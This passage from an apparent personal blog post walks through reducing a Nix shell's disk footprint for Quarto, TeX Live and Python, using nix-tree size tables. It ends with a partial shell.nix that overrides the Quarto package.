<span id="cb16-11">│                                           │diffutils-3.10         43.66 MiB (1.53 MiB)│texplate-1.0.4         953.4 MiB (1.14 KiB)│</span>
<span id="cb16-12">│                                           │findutils-4.9.0        43.46 MiB (1.32 MiB)│bib2gls-3.9           952.17 MiB (1.99 KiB)│</span>
<span id="cb16-13">│                                           │coreutils-9.5          42.13 MiB (2.12 MiB)│texosquery-1.7        950.24 MiB (2.35 KiB)│</span>
<span id="cb16-14">│                                           │patchelf-0.15.0      40.02 MiB (234.31 KiB)│memoize-1.1.2        231.84 MiB (65.53 KiB)│</span>
<span id="cb16-15">│                                           │file-5.45              39.42 MiB (8.33 MiB)│texlive-scripts-705 218.42 MiB (168.54 KiB)│</span>
<span id="cb16-16">│                                           │gnutar-1.35            33.85 MiB (2.67 MiB)│texlive.infra-69740- 210.01 MiB (22.95 MiB)│</span>
<span id="cb16-17">│                                           │gnugrep-3.11         33.68 MiB (922.61 KiB)│pygmentex-0.11       188.14 MiB (18.76 KiB)│</span>
<span id="cb16-18">│                                           │glibc-2.39-52-bin       33.57 MiB (2.6 MiB)│pythontex-0.18      185.94 MiB (300.51 KiB)│</span>
<span id="cb16-19">│                                           │gawk-5.2.2             33.54 MiB (2.57 MiB)│dvisvgm-3.2.2        184.64 MiB (50.79 MiB)│</span>
<span id="cb16-20">│                                           │gzip-1.13             32.66 MiB (152.8 KiB)│lilyglyphs-0.2.4     175.43 MiB (24.97 KiB)│</span>
<span id="cb16-21">│                                           │bash-5.2p26            32.51 MiB (1.54 MiB)│webquiz-5.2          173.81 MiB (44.94 KiB)│</span>
<span id="cb16-22">│                                           │gnumake-4.4.1           32.47 MiB (1.5 MiB)│dviasm-68043         173.61 MiB (44.14 KiB)│</span>
<span id="cb16-23">└───────────────────────────────────────────┴───────────────────────────────────────────┴───────────────────────────────────────────┘</span>
<span id="cb16-24">/nix/store/r7zsi6cdib2yrhp7cpx4qn9d1b70jll5-texlive-combined-full-2023-final</span>
<span id="cb16-25">NAR Size: 342.99 MiB | Closure Size: 6.24 GiB | Added Size: 5.62 GiB</span>
<span id="cb16-26">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>Without the standard environment:</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb17-1">┌───────────────────────────────────────────┬───────────────────────────────────────────┬───────────────────────────────────────────┐</span>
<span id="cb17-2">│nix-shell               7.23 GiB (7.23 GiB)│texlive-combined-full-2 6.24 GiB (5.62 GiB)│fonts.conf               3.64 GiB (3.1 KiB)│</span>
<span id="cb17-3">│                                           │quarto-1.5.25          1.5 GiB (620.99 MiB)│texlive-combined-full-2 3.64 GiB (2.38 MiB)│</span>
<span id="cb17-4">│                                           │python3-3.11.9-env  916.46 MiB (282.95 MiB)│texlive-combined-full-2 3.64 GiB (3.52 KiB)│</span>
<span id="cb17-5">│                                           │npm-10.8.1           310.91 MiB (97.35 MiB)│texlive-combined-full-2 3.64 GiB (3.45 GiB)│</span>
<span id="cb17-6">│                                           │stdenv-linux         67.13 MiB (166.23 KiB)│asymptote-2.88        1.24 GiB (660.91 MiB)│</span>
<span id="cb17-7">│                                           │diffutils-3.10         43.66 MiB (1.53 MiB)│tlcockpit-1.2        1022.89 MiB (1.12 KiB)│</span>
<span id="cb17-8">│                                           │findutils-4.9.0        43.46 MiB (1.32 MiB)│arara-7.1.3           966.03 MiB (1.14 KiB)│</span>
<span id="cb17-9">│                                           │coreutils-9.5          42.13 MiB (2.12 MiB)│latex2nemeth-1.1.3       957.76 MiB (768.0)│</span>
<span id="cb17-10">│                                           │patchelf-0.15.0      40.02 MiB (234.31 KiB)│albatross-0.5.1       955.15 MiB (1.16 KiB)│</span>
<span id="cb17-11">│                                           │file-5.45              39.42 MiB (8.33 MiB)│texplate-1.0.4         953.4 MiB (1.14 KiB)│</span>
<span id="cb17-12">│                                           │gnutar-1.35            33.85 MiB (2.67 MiB)│bib2gls-3.9           952.17 MiB (1.99 KiB)│</span>
<span id="cb17-13">│                                           │gnugrep-3.11         33.68 MiB (922.61 KiB)│texosquery-1.7        950.24 MiB (2.35 KiB)│</span>
<span id="cb17-14">│                                           │gawk-5.2.2             33.54 MiB (2.57 MiB)│memoize-1.1.2        231.84 MiB (65.53 KiB)│</span>
<span id="cb17-15">│                                           │gzip-1.13             32.66 MiB (152.8 KiB)│texlive-scripts-705 218.42 MiB (168.54 KiB)│</span>
<span id="cb17-16">│                                           │bash-5.2p26            32.51 MiB (1.54 MiB)│texlive.infra-69740- 210.01 MiB (22.95 MiB)│</span>
<span id="cb17-17">│                                           │gnumake-4.4.1           32.47 MiB (1.5 MiB)│pygmentex-0.11       188.14 MiB (18.76 KiB)│</span>
<span id="cb17-18">│                                           │xz-5.4.6-bin         31.91 MiB (172.22 KiB)│pythontex-0.18      185.94 MiB (300.51 KiB)│</span>
<span id="cb17-19">│                                           │gnused-4.9           31.67 MiB (714.07 KiB)│dvisvgm-3.2.2        184.64 MiB (50.79 MiB)│</span>
<span id="cb17-20">│                                           │patch-2.7.6          31.32 MiB (359.24 KiB)│lilyglyphs-0.2.4     175.43 MiB (24.97 KiB)│</span>
<span id="cb17-21">│                                           │bzip2-1.0.8-bin       31.11 MiB (67.24 KiB)│webquiz-5.2          173.81 MiB (44.94 KiB)│</span>
<span id="cb17-22">│                                           │                                           │dviasm-68043         173.61 MiB (44.14 KiB)│</span>
<span id="cb17-23">└───────────────────────────────────────────┴───────────────────────────────────────────┴───────────────────────────────────────────┘</span>
<span id="cb17-24">/nix/store/r7zsi6cdib2yrhp7cpx4qn9d1b70jll5-texlive-combined-full-2023-final</span>
<span id="cb17-25">NAR Size: 342.99 MiB | Closure Size: 6.24 GiB | Added Size: 5.62 GiB</span>
<span id="cb17-26">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>This is a decent difference (26 megabytes) — and indeed, it was as I thought, the latex bundle package uses up the most disk space out of everything.</p>
<p>I did some research, continuing to find an even more minimal shell. However, it doesn’t seem to be worth it. One <a href="https://discourse.nixos.org/t/with-default-nix-empty-nix-installs-packages-why/20284/3">solution</a> mentions to use <a href="https://github.com/numtide/devshell">devshell</a>, however, after browsing the source code, it doesn’t seem to be that much more minimal thank mkShellNoCC, and the documentation is sparse… it suggestst TOML, rather than nix for configuring the shell environment. And finally, the entire point of this endeavor was to <em>avoid</em> using external dependencies for my shell environments…</p>
<p>There is also <a href="https://fzakaria.com/2021/08/02/a-minimal-nix-shell.html">another blogpost</a> where they attempt to strip down the nix shell environment of dependencies, including GNU coreutils, but it eventually fails because the basic nix shell environment requires <code>mkdir</code>.</p>
<p>Now… which latex distribution should I switch to? I probably don’t need the every single latex package in nixpkgs, especially if all I want is to render a pdf.</p>
<p>Currently, I am using <code>texlive.combined.scheme-full</code>, which is exactly that. According to the <a href="https://quarto.org/docs/output-formats/pdf-engine.html#overview">quarto pdf docs</a>, quarto recommends, and also is able to install <code>tinytex</code>. WHen quarto manages a texlive or tinytex distribution, it is also able to automatically install missing packages.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb18-1">────────────────────────────────────────┬────────────────────────────────────────┬───────────────────────────────────────┐</span>
<span id="cb18-2">│nix-shell            1.84 GiB (1.84 GiB)│quarto-1.5.25       1.5 GiB (620.99 MiB)│python3-3.11.9- 916.46 MiB (729.13 MiB)│</span>
<span id="cb18-3">│                                        │python3-3.11.9-e 916.46 MiB (729.13 MiB)│deno-1.43.6     239.73 MiB (199.93 MiB)│</span>
<span id="cb18-4">│                                        │texlive-2023-env 527.99 MiB (340.17 MiB)│dart-sass-1.77.4  49.52 MiB (18.54 MiB)│</span>
<span id="cb18-5">│                                        │stdenv-linux      67.13 MiB (166.23 KiB)│esbuild-0.21.5     43.2 MiB (10.09 MiB)│</span>
<span id="cb18-6">│                                        │diffutils-3.10      43.66 MiB (1.53 MiB)│bash-5.2p26        32.51 MiB (1.54 MiB)│</span>
<span id="cb18-7">│                                        │findutils-4.9.0     43.46 MiB (1.32 MiB)│                                       │</span>
<span id="cb18-8">│                                        │coreutils-9.5       42.13 MiB (2.12 MiB)│                                       │</span>
<span id="cb18-9">│                                        │patchelf-0.15.0   40.02 MiB (234.31 KiB)│                                       │</span>
<span id="cb18-10">│                                        │file-5.45           39.42 MiB (8.33 MiB)│                                       │</span>
<span id="cb18-11">│                                        │gnutar-1.35         33.85 MiB (2.67 MiB)│                                       │</span>
<span id="cb18-12">│                                        │gnugrep-3.11      33.68 MiB (922.61 KiB)│                                       │</span>
<span id="cb18-13">│                                        │gawk-5.2.2          33.54 MiB (2.57 MiB)│                                       │</span>
<span id="cb18-14">│                                        │gzip-1.13          32.66 MiB (152.8 KiB)│                                       │</span>
<span id="cb18-15">│                                        │bash-5.2p26         32.51 MiB (1.54 MiB)│                                       │</span>
<span id="cb18-16">│                                        │gnumake-4.4.1        32.47 MiB (1.5 MiB)│                                       │</span>
<span id="cb18-17">│                                        │xz-5.4.6-bin      31.91 MiB (172.22 KiB)│                                       │</span>
<span id="cb18-18">│                                        │gnused-4.9        31.67 MiB (714.07 KiB)│                                       │</span>
<span id="cb18-19">│                                        │patch-2.7.6       31.32 MiB (359.24 KiB)│                                       │</span>
<span id="cb18-20">│                                        │bzip2-1.0.8-bin    31.11 MiB (67.24 KiB)│                                       │</span>
<span id="cb18-21">│                                        │                                        │                                       │</span>
<span id="cb18-22">│                                        │                                        │                                       │</span>
<span id="cb18-23">│                                        │                                        │                                       │</span>
<span id="cb18-24">└────────────────────────────────────────┴────────────────────────────────────────┴───────────────────────────────────────┘</span>
<span id="cb18-25">/nix/store/gc3phrmibx7zp5q16n5vy3h1ra6wjckr-quarto-1.5.25</span>
<span id="cb18-26">NAR Size: 392.41 MiB | Closure Size: 1.5 GiB | Added Size: 620.99 MiB</span>
<span id="cb18-27">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>After a lot of tinkering with latex packages, I manage to get it down to just under 2 GB of disk space used. Can I make it smaller? What about bzip, tar, or other coreutils that are taking up space?</p>
<p>I decided to tinker with python and jupyter notebooks next. I was previously using the <code>juptyer</code> package, which is a metapackage containing all the jupyter components. I managed to cut it down quite a bit, to just <code>jupyter-core</code> and <code>pyaml</code>. This reduced the size further:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb19-1">┌──────────────────────────────────────────────────────┬──────────────────────────────────────────────────────┬─────────────────────────────────────────────────────┐</span>
<span id="cb19-2">│nix-shell                          1.11 GiB (1.11 GiB)│quarto-1.5.47                  529.43 MiB (479.77 MiB)│deno-1.43.6                   239.73 MiB (199.93 MiB)│</span>
<span id="cb19-3">│                                                      │texlive-2023-env               527.99 MiB (462.84 MiB)│typst-0.11.1                    76.53 MiB (30.55 MiB)│</span>
<span id="cb19-4">│                                                      │python3-3.11.9-env              176.66 MiB (120.1 MiB)│dart-sass-1.77.4                49.52 MiB (18.54 MiB)│</span>
<span id="cb19-5">│                                                      │stdenv-linux                    67.13 MiB (166.23 KiB)│esbuild-0.21.5                   43.2 MiB (10.09 MiB)│</span>
<span id="cb19-6">│                                                      │diffutils-3.10                    43.66 MiB (1.53 MiB)│bash-5.2p26                      32.51 MiB (1.54 MiB)│</span>
<span id="cb19-7">│                                                      │findutils-4.9.0                   43.46 MiB (1.32 MiB)│                                                     │</span>
<span id="cb19-8">│                                                      │coreutils-9.5                     42.13 MiB (2.12 MiB)│                                                     │</span>
<span id="cb19-9">│                                                      │patchelf-0.15.0                 40.02 MiB (234.31 KiB)│                                                     │</span>
<span id="cb19-10">│                                                      │file-5.45                         39.42 MiB (8.33 MiB)│                                                     │</span>
<span id="cb19-11">│                                                      │gnutar-1.35                       33.85 MiB (2.67 MiB)│                                                     │</span>
<span id="cb19-12">│                                                      │gnugrep-3.11                    33.68 MiB (922.61 KiB)│                                                     │</span>
<span id="cb19-13">│                                                      │gawk-5.2.2                        33.54 MiB (2.57 MiB)│                                                     │</span>
<span id="cb19-14">│                                                      │gzip-1.13                        32.66 MiB (152.8 KiB)│                                                     │</span>
<span id="cb19-15">│                                                      │bash-5.2p26                       32.51 MiB (1.54 MiB)│                                                     │</span>
<span id="cb19-16">│                                                      │gnumake-4.4.1                      32.47 MiB (1.5 MiB)│                                                     │</span>
<span id="cb19-17">│                                                      │xz-5.4.6-bin                    31.91 MiB (172.22 KiB)│                                                     │</span>
<span id="cb19-18">│                                                      │gnused-4.9                      31.67 MiB (714.07 KiB)│                                                     │</span>
<span id="cb19-19">│                                                      │patch-2.7.6                     31.32 MiB (359.24 KiB)│                                                     │</span>
<span id="cb19-20">│                                                      │bzip2-1.0.8-bin                  31.11 MiB (67.24 KiB)│                                                     │</span>
<span id="cb19-21">│                                                      │                                                      │                                                     │</span>
<span id="cb19-22">└──────────────────────────────────────────────────────┴──────────────────────────────────────────────────────┴─────────────────────────────────────────────────────┘</span>
<span id="cb19-23">/nix/store/5phsvm3n78djp6gbmmda3jvm912h3gwg-quarto-1.5.47</span>
<span id="cb19-24">NAR Size: 220.63 MiB | Closure Size: 529.43 MiB | Added Size: 479.77 MiB</span>
<span id="cb19-25">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>However, can I reduce it further? I remove the size of quarto’s installation, by deleting the vendored versions of deno, typst, dart-sass, and esbuild, and using the nix versions instead. But what if that’s what’s using up more space?</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb20-1">┌──────────────────────────────────────────────────────┬──────────────────────────────────────────────────────┬─────────────────────────────────────────────────────┐</span>
<span id="cb20-2">│nix-shell                          1.04 GiB (1.04 GiB)│texlive-2023-env               527.99 MiB (462.84 MiB)│bash-5.2p26                      32.51 MiB (1.54 MiB)│</span>
<span id="cb20-3">│                                                      │quarto-1.5.47                  434.33 MiB (401.81 MiB)│                                                     │</span>
<span id="cb20-4">│                                                      │python3-3.11.9-env             176.66 MiB (120.21 MiB)│                                                     │</span>
<span id="cb20-5">│                                                      │stdenv-linux                    67.13 MiB (166.23 KiB)│                                                     │</span>
<span id="cb20-6">│                                                      │diffutils-3.10                    43.66 MiB (1.53 MiB)│                                                     │</span>
<span id="cb20-7">│                                                      │findutils-4.9.0                   43.46 MiB (1.32 MiB)│                                                     │</span>
<span id="cb20-8">│                                                      │coreutils-9.5                     42.13 MiB (2.12 MiB)│                                                     │</span>
<span id="cb20-9">│                                                      │patchelf-0.15.0                 40.02 MiB (234.31 KiB)│                                                     │</span>
<span id="cb20-10">│                                                      │file-5.45                         39.42 MiB (8.33 MiB)│                                                     │</span>
<span id="cb20-11">│                                                      │gnutar-1.35                       33.85 MiB (2.67 MiB)│                                                     │</span>
<span id="cb20-12">│                                                      │gnugrep-3.11                    33.68 MiB (922.61 KiB)│                                                     │</span>
<span id="cb20-13">│                                                      │gawk-5.2.2                        33.54 MiB (2.57 MiB)│                                                     │</span>
<span id="cb20-14">│                                                      │gzip-1.13                        32.66 MiB (152.8 KiB)│                                                     │</span>
<span id="cb20-15">│                                                      │bash-5.2p26                       32.51 MiB (1.54 MiB)│                                                     │</span>
<span id="cb20-16">│                                                      │gnumake-4.4.1                      32.47 MiB (1.5 MiB)│                                                     │</span>
<span id="cb20-17">│                                                      │xz-5.4.6-bin                    31.91 MiB (172.22 KiB)│                                                     │</span>
<span id="cb20-18">│                                                      │gnused-4.9                      31.67 MiB (714.07 KiB)│                                                     │</span>
<span id="cb20-19">│                                                      │patch-2.7.6                     31.32 MiB (359.24 KiB)│                                                     │</span>
<span id="cb20-20">│                                                      │bzip2-1.0.8-bin                  31.11 MiB (67.24 KiB)│                                                     │</span>
<span id="cb20-21">│                                                      │                                                      │                                                     │</span>
<span id="cb20-22">└──────────────────────────────────────────────────────┴──────────────────────────────────────────────────────┴─────────────────────────────────────────────────────┘</span>
<span id="cb20-23">/nix/store/a6v1glf1w6jfm949jlydb6imlbyimddw-quarto-1.5.47</span>
<span id="cb20-24">NAR Size: 401.81 MiB | Closure Size: 434.33 MiB | Added Size: 401.81 MiB</span>
<span id="cb20-25">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>Removing nix dependencies gets it down to 1.04 GB… but I don’t really like this setup. Vendoring is kinda problematic for a variety of reasons. I’m already vendoring pandoc, for example, and if pandoc is used again outside of the nix store, then it would take up twice as much disk space.</p>
<p>Another thing is versioning. Although the pandoc version quarto provides is newer than the one in nixpkgs, the version of typst is the same, and the versions of dart-sass and deno is <em>older</em> by 4 minor versions.</p>
<p>But, when comparing nix-tree and looking at the ark, most of the packages outside quarto are bigger… or are they?</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb21-1">┌──────────────────────────────────────────────────────┬──────────────────────────────────────────────────────┬─────────────────────────────────────────────────────┐</span>
<span id="cb21-2">│                                                      │nix-shell                          1.03 GiB (1.03 GiB)│texlive-2023-env              527.99 MiB (462.84 MiB)│</span>
<span id="cb21-3">│                                                      │                                                      │quarto-1.5.47                 443.91 MiB (396.38 MiB)│</span>
<span id="cb21-4">│                                                      │                                                      │python3-3.11.9-env            176.66 MiB (120.21 MiB)│</span>
<span id="cb21-5">│                                                      │                                                      │stdenv-linux                   67.13 MiB (166.23 KiB)│</span>
<span id="cb21-6">│                                                      │                                                      │diffutils-3.10                   43.66 MiB (1.53 MiB)│</span>
<span id="cb21-7">│                                                      │                                                      │findutils-4.9.0                  43.46 MiB (1.32 MiB)│</span>
<span id="cb21-8">│                                                      │                                                      │coreutils-9.5                    42.13 MiB (2.12 MiB)│</span>
<span id="cb21-9">│                                                      │                                                      │patchelf-0.15.0                40.02 MiB (234.31 KiB)│</span>
<span id="cb21-10">│                                                      │                                                      │file-5.45                        39.42 MiB (8.33 MiB)│</span>
<span id="cb21-11">│                                                      │                                                      │gnutar-1.35                      33.85 MiB (2.67 MiB)│</span>
<span id="cb21-12">│                                                      │                                                      │gnugrep-3.11                   33.68 MiB (922.61 KiB)│</span>
<span id="cb21-13">│                                                      │                                                      │gawk-5.2.2                       33.54 MiB (2.57 MiB)│</span>
<span id="cb21-14">│                                                      │                                                      │gzip-1.13                       32.66 MiB (152.8 KiB)│</span>
<span id="cb21-15">│                                                      │                                                      │bash-5.2p26                      32.51 MiB (1.54 MiB)│</span>
<span id="cb21-16">│                                                      │                                                      │gnumake-4.4.1                     32.47 MiB (1.5 MiB)│</span>
<span id="cb21-17">│                                                      │                                                      │xz-5.4.6-bin                   31.91 MiB (172.22 KiB)│</span>
<span id="cb21-18">│                                                      │                                                      │gnused-4.9                     31.67 MiB (714.07 KiB)│</span>
<span id="cb21-19">│                                                      │                                                      │patch-2.7.6                    31.32 MiB (359.24 KiB)│</span>
<span id="cb21-20">│                                                      │                                                      │bzip2-1.0.8-bin                 31.11 MiB (67.24 KiB)│</span>
<span id="cb21-21">│                                                      │                                                      │                                                     │</span>
<span id="cb21-22">└──────────────────────────────────────────────────────┴──────────────────────────────────────────────────────┴─────────────────────────────────────────────────────┘</span>
<span id="cb21-23">/nix/store/67sndag759yw2wvfrfgfszpgzvbyg3gk-nix-shell</span>
<span id="cb21-24">NAR Size: 5.35 KiB | Closure Size: 1.03 GiB | Added Size: 1.03 GiB</span>
<span id="cb21-25">Immediate Parents: -</span></code></pre></div>
<p>Changing to the typst in nixpkgs decreases the size just a little bit. Not a lot, but just a little bit. It’s a pity that changing deno and dart-sass for the nixpkgs versions increases the size by quite a bit, as the nixpkgs versions are newer. Changing pandoc also increases size, but the pandoc version provided by quarto is newer.</p>
<p>I also changed esbuild, and got it down to 1.02 GB.</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb22-1">┌──────────────────────────────────────────────────────┬──────────────────────────────────────────────────────┬─────────────────────────────────────────────────────┐</span>
<span id="cb22-2">│nix-shell                          1.02 GiB (1.02 GiB)│texlive-2023-env               527.99 MiB (462.84 MiB)│typst-0.11.1                    76.53 MiB (30.55 MiB)│</span>
<span id="cb22-3">│                                                      │quarto-1.5.47                  434.75 MiB (387.22 MiB)│bash-5.2p26                      32.51 MiB (1.54 MiB)│</span>
<span id="cb22-4">│                                                      │python3-3.11.9-env             176.66 MiB (120.21 MiB)│                                                     │</span>
<span id="cb22-5">│                                                      │stdenv-linux                    67.13 MiB (166.23 KiB)│                                                     │</span>
<span id="cb22-6">│                                                      │diffutils-3.10                    43.66 MiB (1.53 MiB)│                                                     │</span>
<span id="cb22-7">│                                                      │findutils-4.9.0                   43.46 MiB (1.32 MiB)│                                                     │</span>
<span id="cb22-8">│                                                      │coreutils-9.5                     42.13 MiB (2.12 MiB)│                                                     │</span>
<span id="cb22-9">│                                                      │patchelf-0.15.0                 40.02 MiB (234.31 KiB)│                                                     │</span>
<span id="cb22-10">│                                                      │file-5.45                         39.42 MiB (8.33 MiB)│                                                     │</span>
<span id="cb22-11">│                                                      │gnutar-1.35                       33.85 MiB (2.67 MiB)│                                                     │</span>
<span id="cb22-12">│                                                      │gnugrep-3.11                    33.68 MiB (922.61 KiB)│                                                     │</span>
<span id="cb22-13">│                                                      │gawk-5.2.2                        33.54 MiB (2.57 MiB)│                                                     │</span>
<span id="cb22-14">│                                                      │gzip-1.13                        32.66 MiB (152.8 KiB)│                                                     │</span>
<span id="cb22-15">│                                                      │bash-5.2p26                       32.51 MiB (1.54 MiB)│                                                     │</span>
<span id="cb22-16">│                                                      │gnumake-4.4.1                      32.47 MiB (1.5 MiB)│                                                     │</span>
<span id="cb22-17">│                                                      │xz-5.4.6-bin                    31.91 MiB (172.22 KiB)│                                                     │</span>
<span id="cb22-18">│                                                      │gnused-4.9                      31.67 MiB (714.07 KiB)│                                                     │</span>
<span id="cb22-19">│                                                      │patch-2.7.6                     31.32 MiB (359.24 KiB)│                                                     │</span>
<span id="cb22-20">│                                                      │bzip2-1.0.8-bin                  31.11 MiB (67.24 KiB)│                                                     │</span>
<span id="cb22-21">│                                                      │                                                      │                                                     │</span>
<span id="cb22-22">└──────────────────────────────────────────────────────┴──────────────────────────────────────────────────────┴─────────────────────────────────────────────────────┘</span>
<span id="cb22-23">/nix/store/zv70xxgak45jl997c53lwh91b7v3qz6s-quarto-1.5.47</span>
<span id="cb22-24">NAR Size: 356.66 MiB | Closure Size: 434.75 MiB | Added Size: 387.22 MiB</span>
<span id="cb22-25">Immediate Parents (1): nix-shell</span></code></pre></div>
<p>I think this is the final iteration. Down to 1 GB is already a lot, and I think this will be the final iteration.</p>
<p>Here is the final shell.nix:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>shell.nix</strong></pre>
</div>
<div class="sourceCode" id="cb23" data-filename="shell.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb23-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">?</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> &lt;nixpkgs&gt; <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>:</span>
<span id="cb23-2"></span>
<span id="cb23-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb23-4">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">python3</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.python311<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-5">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pythonDeps</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ps</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> ps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb23-6">    jupyter-core</span>
<span id="cb23-7">    pyyaml</span>
<span id="cb23-8">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb23-9"></span>
<span id="cb23-10">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">texDeps</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ps</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> ps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb23-11">    collection-latex</span>
<span id="cb23-12">    collection-latexrecommended</span>
<span id="cb23-13">    xetex</span>
<span id="cb23-14">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb23-15"></span>
<span id="cb23-16">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">quarto</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.quarto.overrideAttrs <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">oldAttrs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">rec</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb23-17">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># 1.3 + newer (I think) has a weird bug with the text boxes where they are white on a black background. Readable, but ugly</span></span>
<span id="cb23-18">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">version</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.5.47"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-19">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> pkgs.fetchurl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb23-20">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/quarto-dev/quarto-cli/releases/download/v</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>version<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/quarto-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>version<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-linux-amd64.tar.gz"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-21">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sha256</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256-Zfx3it7vhP+9vN8foveQ0xLcjPn5A7J/n+zupeFNwEk="</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-22">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb23-23">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">preFixup</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb23-24"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      wrapProgram $out/bin/quarto \</span></span>
<span id="cb23-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        --prefix QUARTO_TYPST : </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>pkgs.lib.makeBinPath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> pkgs.typst <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/typst \</span></span>
<span id="cb23-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        --prefix QUARTO_ESBUILD </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>pkgs.lib.makeBinPath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> pkgs.esbuild <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span><span class="sc" style="color: #5E5E5E;
background-color: null;
